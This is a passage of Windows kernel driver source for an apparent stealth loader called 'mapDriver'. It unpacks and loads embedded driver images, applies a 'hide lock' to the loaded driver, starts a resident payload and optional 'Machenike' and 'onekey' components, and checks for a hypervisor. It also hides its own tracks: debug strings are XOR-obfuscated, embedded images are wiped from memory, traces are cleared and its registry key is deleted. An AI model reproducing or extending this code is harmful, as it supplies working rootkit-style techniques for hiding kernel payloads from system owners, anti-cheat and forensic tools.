#if MAPDRIVER_IMAGE_WIPE_ENABLED
            RtlSecureZeroMemory(test_sys, sizeof(test_sys));
#endif
            mapdriver_clear_traces(driver_name, true);
            LOG_DEBUG(_XOR_("[mapDriver] hv already ready, stale self-stop failed used=%d self=0x%llX ack=0x%llX exc=0x%llX\n"),
                (int)stale_stop_used,
                stale.selfstop_result,
                stale.selfstop_ack,
                stale.selfstop_exceptions);
#if MAPDRIVER_FAIL_LOAD_IF_HV_ALREADY_READY
            mapdriver_delete_control_device();
            if (DriverObject)
                DriverObject->DriverUnload = nullptr;
            g_host_driver_object = nullptr;
            return STATUS_DEVICE_ALREADY_ATTACHED;
#else
            return STATUS_SUCCESS;
#endif
        }
    }

    PUCHAR test_image = nullptr;
    ULONG test_image_size = 0;
    if (mapdriver_unpack_test_sys(&test_image, &test_image_size))
    {
        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack ok size=0x%X\n"), test_image_size);
        if (mapdriver_load_testdriver(test_image))
        {
            LOG_DEBUG(_XOR_("[mapDriver] TestDriver load ok base=%p size=0x%X\n"), Utils::imageBase, Utils::imageSize);
            mapdriver_save_testdriver_image_base();
            mapdriver_apply_testdriver_hide_lock();
            bool payload_ok = mapdriver_load_resident_payload_expanded();
#if MAPDRIVER_AUTO_LOAD_MACHENIKE_ON_BOOT
            if (payload_ok)
            {
                bool machenike_ok = mapdriver_load_machenike(DriverObject, RegistryPath, FALSE);
                LOG_DEBUG(_XOR_("[mapDriver] Machenike embedded auto-load ok=%d base=%p size=0x%X\n"),
                    (int)machenike_ok, Utils::machenikeBase, Utils::machenikeSize);
            }
#endif
#if MAPDRIVER_AUTO_ONEKEY_LOAD
            if (payload_ok)
            {
#if MAPDRIVER_AUTO_ONEKEY_USE_THREAD
                mapdriver_start_onekey_worker();
#else
                bool onekey_ok = mapdriver_run_onekey_expanded(DriverObject);
                LOG_DEBUG(_XOR_("[mapDriver] onekey sync leave ok=%d\n"), (int)onekey_ok);
                if (!onekey_ok)
                    final_status = STATUS_DEVICE_NOT_READY;
#endif
            }
#endif
#if MAPDRIVER_AUTO_HANDOFF_AFTER_PAYLOAD
            if (payload_ok)
            {
                LOG_DEBUG(_XOR_("[mapDriver] auto handoff after payload start %d\n"), 1);
                mapdriver_unload_common(DriverObject, true);
            }
#endif
            if (NT_SUCCESS(final_status) || final_status == STATUS_UNSUCCESSFUL)
            {
#if MAPDRIVER_AUTO_ONEKEY_LOAD && !MAPDRIVER_AUTO_ONEKEY_USE_THREAD && MAPDRIVER_AUTO_ONEKEY_RETURN_FAILURE
                final_status = STATUS_UNSUCCESSFUL;
#else
                final_status = STATUS_SUCCESS;
#endif
            }
        }
        else
        {
            LOG_DEBUG(_XOR_("[mapDriver] TestDriver load failed %d\n"), 0);
            if (!mapdriver_hv_ready())
                Utils::FreePayloadArena();
        }

        mapdriver_release_test_sys(test_image, test_image_size);
    }
    else
    {
        LOG_DEBUG(_XOR_("[mapDriver] TestDriver unpack failed %d\n"), 0);
    }

#if MAPDRIVER_IMAGE_WIPE_ENABLED
    RtlSecureZeroMemory(test_sys, sizeof(test_sys));
#if MAPDRIVER_AUTO_LOAD_MACHENIKE_ON_BOOT
    RtlSecureZeroMemory(machenike_sys, sizeof(machenike_sys));
#endif
#endif
    if (!NT_SUCCESS(final_status))
    {
        mapdriver_delete_control_device();
        if (DriverObject)
            DriverObject->DriverUnload = nullptr;
        g_host_driver_object = nullptr;
    }
#if MAPDRIVER_AUTO_ONEKEY_LOAD && MAPDRIVER_AUTO_ONEKEY_DROP_MAP_CTL
    else
    {
        mapdriver_delete_registry_key(RegistryPath);
    }
#endif
    mapdriver_clear_traces(driver_name, true);
    LOG_DEBUG(_XOR_("[mapDriver] DriverMain leave final_status=0x%08X\n"), final_status);
    return final_status;
}

static VOID mapdriver_driver_main_callout(PVOID parameter)
{
    mapdriver_driver_main_context* const ctx =
        static_cast<mapdriver_driver_main_context*>(parameter);
    if (!ctx)
        return;

    ctx->result = mapdriver_driver_main_body(ctx->driver_object, ctx->registry_path);
    ctx->completed = TRUE;
}

EXTERN_C NTSTATUS DriverMain(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    // DriverEntry is required to arrive at PASSIVE_LEVEL.  Do not fall back to
    // the caller's small kernel stack if expansion is unavailable.
    if (KeGetCurrentIrql() != PASSIVE_LEVEL)
        return STATUS_INVALID_DEVICE_STATE;

    mapdriver_driver_main_context ctx = {};
    ctx.driver_object = DriverObject;
    ctx.registry_path = RegistryPath;
    ctx.result = STATUS_UNSUCCESSFUL;

    NTSTATUS const expand_status = KeExpandKernelStackAndCalloutEx(
        mapdriver_driver_main_callout,
        &ctx,
        48 * 1024,
        FALSE,
        nullptr);
    if (!NT_SUCCESS(expand_status))
        return expand_status;
    if (!ctx.completed)
        return STATUS_UNSUCCESSFUL;

    return ctx.result;
}
